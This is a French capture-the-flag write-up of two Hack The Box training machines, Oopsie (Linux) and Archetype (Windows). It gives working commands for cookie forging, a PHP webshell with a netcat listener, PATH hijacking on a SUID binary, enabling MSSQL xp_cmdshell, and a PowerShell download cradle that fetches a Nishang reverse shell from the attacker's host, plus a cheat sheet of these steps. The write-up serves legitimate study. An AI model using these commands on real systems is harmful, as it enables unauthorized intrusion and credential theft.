# HTB — Oopsie & Archetype (Starting Point, Tier 2)

> Deux box Tier 2 attaquées en solo, sans le guide (conditions eJPT). Oopsie (Linux) : broken access control → webshell → PATH hijacking. Archetype (Windows) : SMB anonyme → MSSQL `xp_cmdshell` → reverse shell PowerShell → historique PowerShell → psexec.
>
> Convention de défang : `·` = caractère à retirer, `hxxp` = `http`. Ex. `Download·String` → `DownloadString`. Réflexe de la séance : avant d'écrire un payload → « je suis sur quel OS ? ».

---

# Box 1 — Oopsie (Tier 2, Linux)

**Thème :** page cachée dans le code source → cookie admin forgé (broken access control) → upload webshell → réutilisation de mdp → PATH hijacking sur binaire SUID → root.

## 1. Recon
```bash
nmap -sV -sC <ip>        # → 22/tcp ssh, 80/tcp http
```
Recon « pauvre » : seulement 22 + 80, pas de faille évidente, gobuster ne sort que des chemins 403. Piège du découragement → la prise n'est pas dans les dossiers devinables.

## 2. La porte cachée = le code source
Le site « propre » ne montre rien, mais le HTML révèle un chemin que gobuster ne pouvait pas deviner :
```
/cdn-cgi/login
```
Réflexe : le code source (Ctrl+U) chuchote ce que la page rend invisible. Toujours le lire.

## 3. Login → cookie admin forgé (Broken Access Control)
Connexion possible en invité sans identifiants. Une fois dedans, l'accès est bridé (rôle guest). En manipulant le cookie (l'`id`/`role` de l'utilisateur), on se fait passer pour l'admin → accès à une fonctionnalité d'upload. Le serveur fait confiance à une valeur que le CLIENT contrôle (le cookie). L'interface ment, le cookie est la vérité.

## 4. Upload d'un webshell → foothold
Le site tourne en PHP → on uploade un reverse shell `.php`.
- Piège 1 : `https://` au lieu de `http://` → le service est sur le port 80 = HTTP, pas HTTPS.
- Piège 2 : où atterrit le fichier ? Un dossier `/uploads` en 403 ne veut PAS dire inaccessible : 403 = « listage interdit », mais un fichier précis dedans reste joignable par son nom exact.
- Piège 3 : LHOST mal configuré dans le reverse shell → il faut mon IP `tun0`, pas 127.0.0.1.
```bash
nc -lvnp 4444                          # listener AVANT
curl http://<ip>/uploads/rev.php       # réveille le webshell
```

## 5. Stabiliser + situational awareness
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id ; whoami ; hostname                 # → www-data (bas étage)
```

## 6. Réutilisation de mot de passe
Les identifiants de la DB traînent en clair dans le code du site :
```bash
cat /var/www/html/cdn-cgi/login/db.php
# $conn = mysqli_connect('localhost','robert','<mdp>','garage');
su robert     # ou ssh robert@<ip> — même mdp → user flag
```
Un mdp trouvé quelque part → on le reteste ailleurs.

## 7. Privesc root = PATH hijacking sur SUID
```bash
id                                     # groups=...,1001(bugtracker)  ← groupe CUSTOM = signal rouge
find / -perm -4000 2>/dev/null         # → /usr/bin/bugtracker  (SUID custom, MÊME NOM que le groupe)
strings /usr/bin/bugtracker            # révèle : system() + setuid + "cat /root/reports/"
```
Le binaire est SUID root et fait `system("cat /root/reports/<input>")` → `cat` appelé SANS chemin absolu. Or `system()` cherche `cat` via le `PATH`, de gauche à droite, premier trouvé gagne. Et le PATH, c'est moi qui le contrôle :
```bash
cd /tmp
echo '/bin/bash' > cat        # PAS de slash final : /bin/bash (pas /bin/bash/)
chmod +x cat
export PATH=/tmp:$PATH        # /tmp EN TÊTE (sinon le vrai /bin/cat gagne)
bugtracker                    # donne n'importe quel Bug ID → lance MON cat = /bin/bash EN ROOT
id                            # uid=0(root)
```
Règle : un binaire privilégié qui appelle une commande par son NOM NU délègue à mon `$PATH` le choix du binaire réel → je le contrôle. `system()`/`popen()` + commande sans `/` = oreilles qui sifflent.
Purple : le fix dev = chemin absolu (`/bin/cat`) + ne pas passer par un shell + assainir l'env. **CWE-426/427 (Untrusted Search Path)**.
Piège vécu : `/bin/bash/` (slash de trop) = « not found » (bash est un fichier, pas un dossier).

---

# Box 2 — Archetype (Tier 2, Windows) — ma 1re vraie box Windows

**Thème :** SMB anonyme → creds dans un `.dtsConfig` → MSSQL (`sql_svc`, sysadmin) → `xp_cmdshell` réactivé → reverse shell PowerShell (download cradle fileless) → historique PowerShell (creds admin) → psexec → SYSTEM.

## 1. Recon — l'histoire des ports raconte « Windows »
```bash
nmap -sV -sC -p- <ip>
# 135, 139, 445 (SMB) · 1433 (MSSQL) · ...  → box WINDOWS
```
Le ping échoue (100% packet loss) = NORMAL sur Windows (pare-feu bloque l'ICMP). La box n'est pas morte.

## 2. SMB anonyme = l'énumération n°1 sur Windows
```bash
smbclient -L //<ip>/ -N          # -N = pas de mot de passe (anonyme)
# → partage "backups"
smbclient //<ip>/backups -N
# get prod.dtsConfig
```
Le fichier `prod.dtsConfig` contient une chaîne de connexion MSSQL en clair :
```
User ID=ARCHETYPE\sql_svc ; Password=<mdp> ; ...
```
L'étape la plus subtile de la box : les secrets dorment dans les partages ouverts.

## 3. MSSQL avec Impacket (PAS les outils Microsoft)
```bash
# sqlcmd / mssql-tools18 = client Microsoft, absent des dépôts Kali (rabbit hole)
# l'outil du pentester :
impacket-mssqlclient ARCHETYPE/sql_svc:<mdp>@<ip> -windows-auth
```
Sur Kali les scripts Impacket sont préfixés `impacket-` et sans `.py`. Le nom qui répond à `-h` = le nom à utiliser. `-windows-auth` obligatoire : l'auth SQL passe par le compte Windows.

## 4. SQL → exécution de commandes OS (`xp_cmdshell`)
```sql
SELECT is_srvrolemember('sysadmin');   -- → 1 : je suis sysadmin
-- xp_cmdshell désactivée par défaut → la réactiver :
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;         RECONFIGURE;
EXEC xp_cmdshell 'whoami';              -- → archetype\sql_svc  (RCE)
```
`sp_configure` = je prépare · `RECONFIGURE` = je valide (comme `git add` puis `git commit`). `xp_cmdshell` est une option « avancée » cachée → il faut d'abord `show advanced options`.

## 5. Reverse shell PowerShell — le download cradle (fileless)
Piège majeur : `bash -i >& /dev/tcp/...` ne marche pas — Windows n'a ni bash ni `/dev/tcp`. `xp_cmdshell` = `cmd.exe`. → il faut un payload Windows.

Windows n'a pas de netcat natif → on utilise le seul couteau suisse présent : PowerShell.
```bash
# Kali : préparer Invoke-PowerShellTcp (Nishang), ajouter EN BAS l'appel de la fonction :
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ~/shell.ps1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress <tun0> -Port 4444' >> ~/shell.ps1
cd ~ && python3 -m http.server 8000    # héberge le script
nc -lvnp 4444                          # listener (autre terminal)
```
Déclencher le download cradle via `xp_cmdshell` (guillemets SQL doublés `''…''`) :
```sql
EXEC xp_cmdshell 'powershell -c "I·EX (New-Object Net.WebClient).Download·String(''hxxp://<tun0>:8000/shell.ps1'')"';
```
`IEX (…).DownloadString(url)` = télécharge le script comme texte et l'exécute en mémoire, sans jamais toucher le disque → discret, pas d'upload, invisible à l'AV qui scanne les fichiers. Le `.ps1` ne contient qu'une fonction → sans l'appel ajouté en bas, rien ne se passe. Vérifs : `GET /shell.ps1 200` côté `http.server` + le shell qui tombe côté `nc`.

## 6. User flag
```cmd
whoami
type C:\Users\sql_svc\Desktop\user.txt
```

## 7. Privesc → Administrator = historique PowerShell
Réflexe Windows n°1 : chercher des identifiants oubliés. PowerShell journalise chaque commande tapée (comme `.bash_history`) :
```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# → une commande avec les creds ADMINISTRATOR en clair
```
Réutilisation de mdp : les creds admin trouvés → on s'y connecte avec Impacket :
```bash
impacket-psexec administrator:'<mdp_admin>'@<ip>
whoami   # → nt authority\system  (le "root" de Windows)
type C:\Users\Administrator\Desktop\root.txt
```

---

# Fiches outils (mémo)

| Besoin | Commande |
|---|---|
| Chemin caché | Lire le code source (Ctrl+U) — gobuster ne devine pas tout |
| 403 sur un dossier | ≠ inaccessible → viser un fichier précis par son nom |
| Chercher un mdp (Linux) | `cat .../db.php` · `grep -ri password /var/www` |
| SUID | `find / -perm -4000 2>/dev/null` |
| Lire un binaire | `strings <binaire>` (system ? setuid ? commande sans `/` ?) |
| PATH hijack | `echo '/bin/bash'>cat ; chmod +x cat ; export PATH=/tmp:$PATH ; <binaire_suid>` |
| SMB anonyme | `smbclient -L //ip/ -N` puis `smbclient //ip/share -N` |
| MSSQL (pentest) | `impacket-mssqlclient DOM/user:pass@ip -windows-auth` |
| Suis-je sysadmin ? | `SELECT is_srvrolemember('sysadmin');` |
| Activer xp_cmdshell | `sp_configure 'show advanced options',1;RECONFIGURE;` puis `'xp_cmdshell',1;RECONFIGURE;` |
| RCE MSSQL | `EXEC xp_cmdshell 'whoami';` |
| Reverse shell Windows | PowerShell download cradle (Nishang `Invoke-PowerShellTcp`) |
| Historique PowerShell | `type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` |
| Login admin Windows | `impacket-psexec administrator:'pass'@ip` → SYSTEM |
| Ping Windows échoue | Normal (pare-feu bloque ICMP) |

---

# Pièges qui m'ont le plus appris

1. **Recon « pauvre » ≠ impasse** — 22/80 + gobuster en 403 → la prise était dans le code source.
2. **403 ≠ mur** — un fichier nommé reste joignable dans un dossier au listage interdit.
3. **`https` vs `http`** — un webshell « qui ne répond pas » à cause du protocole.
4. **LHOST 127.0.0.1** — mettre son IP `tun0`.
5. **`/bin/bash/`** (slash de trop) → « not found ».
6. **Payload du mauvais OS** — `bash`/`/dev/tcp` sur Windows = mort. Toujours se demander l'OS avant.
7. **Mauvais outil** — `sqlcmd`/`mssql-tools18` = client Microsoft, absent de Kali → Impacket.
8. **Nom d'outil** — `mssqlclient.py` n'existe pas → `impacket-mssqlclient` (le nom qui répond à `-h`).
9. **Guillemets SQL** — les `'` internes se doublent (`''…''`) dans une chaîne `xp_cmdshell`.

---

# Bilan

- 2 box Tier 2 rootées en solo, sans le guide — dont ma 1re vraie box Windows.
- Compétences : cookie forging (broken access control), `strings` (reverse eng léger), PATH hijacking sur SUID, `find -perm -4000`, danger des groupes custom, SMB anonyme (`smbclient -N`), Impacket (`mssqlclient`, `psexec`), `xp_cmdshell` (activation `sp_configure`/`RECONFIGURE`), download cradle PowerShell fileless (Nishang), historique PowerShell comme source de creds.
